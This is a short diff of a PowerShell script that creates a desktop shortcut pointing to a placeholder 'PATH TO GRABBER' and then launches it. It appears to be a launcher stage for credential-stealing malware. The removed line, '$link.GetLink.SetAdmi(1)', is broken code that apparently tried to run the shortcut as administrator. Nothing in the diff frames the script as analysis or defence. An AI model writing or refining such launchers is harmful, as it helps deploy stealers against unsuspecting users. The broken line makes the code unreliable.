@@ -4,6 +4,4 @@ $Shortcut = $WScriptShell.CreateShortcut("$env:USERPROFILE\Desktop\MyShortcut.ln
 $Shortcut.TargetPath = "PATH TO GRABBER"
 $Shortcut.Save()
 Start-Sleep -Seconds 1
-$link.GetLink.SetAdmi(1)
-Start-Sleep -Seconds 1
 Start-Process "$env:USERPROFILE\Desktop\MyShortcut.lnk"
